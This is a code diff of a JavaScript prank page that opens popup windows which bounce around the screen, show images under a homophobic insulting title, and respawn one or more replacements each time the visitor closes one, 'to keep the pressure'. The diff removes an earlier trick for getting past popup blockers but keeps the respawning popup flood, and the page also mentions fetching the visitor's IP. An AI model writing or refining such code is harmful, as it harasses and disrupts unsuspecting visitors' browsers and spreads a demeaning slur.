@@ -185,27 +185,6 @@
         if (idx >= text.length || idx <= 0) dir *= -1;
       }, 160);
     })();
-
-    /***********************************************************
-     * Pre-open pool to reduce popup-blocker UI
-     * --- ADDED: preopenPool + preOpenWindows() ---
-     ***********************************************************/
-    const preopenPool = [];
-    function preOpenWindows(n = 6) {
-      for (let i = 0; i < n; i++) {
-        try {
-          // Use about:blank so it's same-origin and writable
-          const w = window.open('about:blank', '_blank');
-          if (w) {
-            // mark it as "reserved" (we'll write to it later)
-            preopenPool.push(w);
-          }
-        } catch (e) {
-          // ignore; if blocked, pool remains small
-        }
-      }
-    }
-
     /***********************************************************
      * Bouncing/popups logic (merged from second script)
      ***********************************************************/
@@ -242,12 +221,11 @@
       const features = `width=${POPUP_WIDTH},height=${POPUP_HEIGHT},left=${left},top=${top},resizable=yes,scrollbars=no,status=no,toolbar=no,menubar=no,location=no`;
       const win = window.open('', '_blank', features);
       if (!win) {
-        // user likely blocked fresh popups
+        alert("Popup blocked! Allow popups for this site and try again.");
         return null;
       }
       return win;
     }
-
     function spawnBouncingWindow() {
       if (!imagePool.length) {
         console.warn('No images in pool');
@@ -255,7 +233,7 @@
       }
       const imgUrl = imagePool[Math.floor(Math.random() * imagePool.length)];
       const html = `<!doctype html>
-      <html><head><meta charset="utf-8"><title>You Gay Af</title>
+      <html><head><meta charset="utf-8"><title>You Gay AF</title>
       <style>html,body{margin:0;height:100%;background:#000;}img{width:100%;height:100%;object-fit:contain;}</style>
       </head><body>
         <img src="${imgUrl}" alt="image" />
@@ -268,83 +246,48 @@
           } catch(e){}
         <\/script>
       </body></html>`;
-
-      // Try to reuse a window from the pre-open pool first (avoids blocker)
-      let win = null;
-      while (preopenPool.length) {
-        const candidate = preopenPool.pop();
-        try {
-          // if the candidate was closed, skip it
-          if (!candidate || candidate.closed) continue;
-          win = candidate;
-          break;
-        } catch (e) {
-          // accessing .closed might fail in rare cases, skip candidate
-          continue;
-        }
-      }
-
-      // If no pre-opened window, fall back to opening a fresh one (may be blocked)
-      if (!win) {
-        win = openPopupBlank('Bouncing');
-        if (!win) {
-          // fresh open was blocked; nothing else to do
-          return;
-        }
-      }
-
+      const win = openPopupBlank('Bouncing');
+      if (!win) return;
       try {
-        // same-origin or about:blank => safe to write
         win.document.open();
         win.document.write(html);
         win.document.close();
       } catch (e) {
         console.error('Failed to write to popup', e);
-        // if write fails, try a fresh open
-        try {
-          const fallback = openPopupBlank('Bouncing');
-          if (fallback) {
-            fallback.document.open();
-            fallback.document.write(html);
-            fallback.document.close();
-            activePopups.add(fallback);
-            // attach monitor & bounce below
-            setupPopupAfterOpen(fallback);
-          }
-        } catch (inner) {}
-        return;
       }
-
       activePopups.add(win);
-      // attach monitor & start bouncing behavior
-      setupPopupAfterOpen(win);
-    }
 
-    // Factor out setup used after popup is created/written
-    function setupPopupAfterOpen(win) {
-      // --- per-window monitor: spawn replacement immediately when closed ---
+      // --- ADDED/CHANGED ---
+      // per-window monitor: checks the popup's .closed property frequently.
+      // When it detects the window was closed it spawns a replacement immediately,
+      // but ensures spawning only once per closed window by setting a flag.
       try {
+        // Add a small custom flag to avoid double-handling from multiple detectors.
         win.__spawn_handled = false;
-      } catch (e) {}
+      } catch (e) {
+        // ignore if property can't be set
+      }
       const monitorInterval = setInterval(() => {
         try {
           if (!win || win.closed) {
             clearInterval(monitorInterval);
+            // mark as handled (some browsers may still trigger message)
             try { win.__spawn_handled = true; } catch(e){}
             activePopups.delete(win);
-            // immediate single replacement
+            // spawn a single replacement immediately
             spawnBouncingWindow();
           }
         } catch (e) {
+          // cross-origin or other access error -> just clear and remove reference
           clearInterval(monitorInterval);
           activePopups.delete(win);
         }
-      }, 350);
+      }, 350); // quick reaction time
+      // --- END ADDED/CHANGED ---
 
-      // start bouncing motion
-      startBouncing(win);
+      // small delay then start bounce
+      setTimeout(() => startBouncing(win), 350 + (Math.random()*300|0));
     }
-
     function startBouncing(win) {
       if (!win || win.closed) return;
       let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
@@ -366,8 +309,7 @@
       }
       tick();
     }
-
-    // If a popup closes, spawn extras (keeps your original idea)
+    // If a popup closes, spawn extras
     function watchForClosures() {
       setInterval(() => {
         let closedCount = 0;
@@ -378,10 +320,12 @@
               closedCount++;
             }
           } catch(e){
+            // if accessing .closed fails, remove it to avoid leaks
             activePopups.delete(win);
           }
         }
         if (closedCount > 0) {
+          // keep behavior aggressive but bounded: spawn at least one per closed window
           const howMany = Math.max(1, closedCount + Math.floor(Math.random()*2));
           for (let i = 0; i < howMany; i++) {
             setTimeout(spawnBouncingWindow, i * 220);
@@ -389,22 +333,25 @@
         }
       }, 900);
     }
-
-    // Listen for child message (child posts beforeunload)
+    // --- ADDED/CHANGED ---
+    // When a child posts 'child_closing', spawn replacements quickly and deterministically.
+    // This compliments the per-window monitor above.
     window.addEventListener('message', (e) => {
       if (e.data?.type === 'child_closing') {
-        // deterministic replacements to keep the pressure
+        // always spawn at least one replacement immediately
         spawnBouncingWindow();
+        // spawn one more shortly after to maintain pressure
         setTimeout(spawnBouncingWindow, 200);
       }
     });
+    // --- END ADDED/CHANGED ---
 
     window.spawnExtra = () => {
       if (Math.random() < 0.6) spawnBouncingWindow();
     };
-
     // Start everything: multiple initial spawns + watchers
     function startBallsChaos() {
+      // quick feedback
       statusEl.textContent = `Spawning chaos — popups may be blocked by your browser. Images: ${imagePool.length}`;
       // open several first
       for (let i = 0; i < 5; i++) spawnBouncingWindow();
@@ -417,7 +364,6 @@
         if (Math.random() < 0.22) spawnBouncingWindow();
       }, true);
     }
-
     /***********************************************************
      * The enterSite function: hides intro, shows main UI,
      * triggers audio, ip fetch, and the bouncing/popups.
@@ -442,18 +388,12 @@
         statusEl.textContent = 'Good luck closing them…';
       }, 1300);
     }
-
-    // wire enter button (initial click) to pre-open windows and do everything
+    // wire enter button (initial click) to do everything
     enterBtn.addEventListener('click', (e) => {
       // prevent double-activation
       enterBtn.style.pointerEvents = 'none';
-      // Pre-open blank windows during the actual user click gesture.
-      // Pick a modest number (6) to reduce chance of being blocked or flagged.
-      preOpenWindows(6);
-      // now run the regular enter-site flow (which will reuse pre-opened windows)
       enterSite();
     });
-
     // Also try a body-level click to resume audio in some browsers
     document.body.addEventListener('click', () => {
       tryPlayAudio();
